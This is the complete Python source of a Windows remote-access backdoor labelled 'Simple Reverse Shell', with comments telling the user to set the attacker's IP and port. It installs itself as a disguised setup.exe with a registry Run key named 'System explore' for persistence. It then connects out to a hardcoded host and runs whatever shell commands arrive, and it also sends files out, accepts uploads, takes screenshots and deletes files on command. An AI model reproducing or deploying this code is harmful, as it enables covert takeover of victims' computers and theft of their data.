#!/usr/bin/env python3
# Simple Reverse Shell - Python 3 port
# Original: Mascerano Bachir (dev-labs.co)
# [!] Yahan IP aur PORT badal lo -> CONNECT_HOST / CONNECT_PORT

import os
import shutil
import socket
import subprocess
import sys
import time
import traceback

try:
    import winreg as reg
except ImportError:
    import _winreg as reg

try:
    from PIL import ImageGrab
    HAS_PIL = True
except ImportError:
    HAS_PIL = False

# ----------------------------------------------------------------------------
CONNECT_HOST = "192.168.119.128"
CONNECT_PORT = 666
EOF = b"EOFEOFX"
CHUNK = 4096

CUR_FILE = os.path.abspath(sys.argv[0])
SERVER_NAME = "\\setup.exe"
USERNAME = os.getenv("USERNAME", "")


# ----------------------------------------------------------------------------
#  PERSISTENCE
# ----------------------------------------------------------------------------
def install():
    if not USERNAME:
        return
    for base in ("C:/Documents and Settings/" + USERNAME, "C:/Users/" + USERNAME):
        if not os.path.exists(base):
            continue
        dist = base + "/regky"
        try:
            if not os.path.isdir(dist):
                os.mkdir(dist)
            target = dist + SERVER_NAME
            if os.path.abspath(target) != CUR_FILE:
                shutil.copy2(CUR_FILE, target)

            a_reg = reg.ConnectRegistry(None, reg.HKEY_CURRENT_USER)
            a_key = reg.OpenKey(a_reg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                                0, reg.KEY_WRITE)
            reg.SetValueEx(a_key, "System explore", 0, reg.REG_SZ, target.replace("/", "\\"))
            reg.CloseKey(a_key)
            print("[+] persistence installed ->", target)
        except Exception as exc:
            print("[!] persistence failed:", exc)
        break


# ----------------------------------------------------------------------------
#  FILE TRANSFER
# ----------------------------------------------------------------------------
def send_file(s, path):
    if not os.path.isfile(path):
        s.sendall(EOF)
        s.sendall(b"invalid filename")
        return
    with open(path, "rb") as f:
        while True:
            chunk = f.read(CHUNK)
            if not chunk:
                break
            s.sendall(chunk)
    time.sleep(0.3)
    s.sendall(EOF)


def recv_file(s, path):
    buf = b""
    while EOF not in buf:
        chunk = s.recv(CHUNK)
        if not chunk:
            break
        buf += chunk
    data, _, _ = buf.partition(EOF)
    with open(path, "wb") as f:
        f.write(data)
    return len(data)


# ----------------------------------------------------------------------------
#  MAIN LOOP
# ----------------------------------------------------------------------------
def do_work():
    while True:
        print("[*] creating socket")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5.0)

        if s.getsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE) == 0:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            print("[*] keepalive on")

        try:
            s.connect((CONNECT_HOST, CONNECT_PORT))
        except socket.error:
            print("[!] connect failed, retry in 10s")
            time.sleep(10)
            continue

        print("[+] connected")

        while True:
            try:
                raw = s.recv(1024)
                if not raw:
                    print("[!] empty recv, reconnect")
                    break

                data = raw.decode(errors="replace").strip()

                # ---- quit ----
                if data == "quit":
                    break

                # ---- download ----
                elif data.startswith("download"):
                    send_file(s, data[9:].strip())

                # ---- upload ----
                elif data.startswith("upload"):
                    try:
                        n = recv_file(s, data[7:].strip())
                        s.sendall(b"Done %d bytes" % n)
                    except Exception as exc:
                        s.sendall(("upload failed: %s" % exc).encode())

                # ---- screenshot ----
                elif data.startswith("pic"):
                    target = data[4:].strip() or "screen.png"
                    if HAS_PIL:
                        try:
                            ImageGrab.grab().save(target, "PNG")
                            s.sendall(b"image saved")
                        except Exception as exc:
                            s.sendall(("pic failed: %s" % exc).encode())
                    else:
                        s.sendall(b"PIL not installed")

                # ---- delete ----
                elif data.startswith("del"):
                    target = data[4:].strip()
                    try:
                        os.remove(target)
                        s.sendall(b"Deleted")
                    except OSError:
                        s.sendall(b"Invalid filename")

                # ---- change dir ----
                elif data.startswith("cd"):
                    path = data[3:].strip()
                    try:
                        os.chdir(path)
                        s.sendall(os.getcwd().encode())
                    except OSError:
                        s.sendall(b"path not found")

                # ---- normal shell command ----
                else:
                    proc = subprocess.Popen(
                        data, shell=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        stdin=subprocess.PIPE,
                    )
                    out = proc.stdout.read() + proc.stderr.read()
                    s.sendall(out if out else b"command successful")

            except socket.timeout:
                continue
            except Exception:
                traceback.print_exc()
                break

        try:
            s.close()
        except Exception:
            pass


if __name__ == "__main__":
    install()
    do_work()
